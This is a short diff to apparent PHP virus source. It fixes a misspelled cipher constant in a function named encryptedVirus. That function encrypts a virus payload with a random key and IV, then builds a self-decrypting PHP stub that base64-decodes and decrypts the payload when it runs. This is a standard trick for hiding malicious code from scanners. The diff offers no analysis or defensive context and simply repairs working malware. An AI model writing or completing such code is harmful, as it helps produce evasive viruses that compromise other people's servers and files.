@@ -35,10 +35,10 @@ function encryptedVirus($virus){
   for($i=0;$i<64;++$i) $key.=$str[rand(0,strlen($str)-1)];
   $key = pack('H*', $key);
   //Encrypt
-  $iv_size = mcrypt_get_iv_size(MCRYPT_RIJDAEL_128, MCRYPT_MODE_CBC);
+  $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
   $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
   $encryptedVirus = mcrypt_encrypt(
-    MCRYPT_RIJDAEL_128,
+    MCRYPT_RIJNDAEL_128,
     $key,
     $virus,
     MCRYPT_MODE_CBC,
@@ -54,7 +54,7 @@ function encryptedVirus($virus){
   \$iv = '$encodedIV';
   \$key = '$encodedKey';
   \$virus = mcrypt_decrypt(
-    MCRYPT_RIJDAEL_128,
+    MCRYPT_RIJNDAEL_128,
     base64_decode(\$key),
     base64_decode(\$encodedVirus),
     MCRYPT_MODE_CBC,
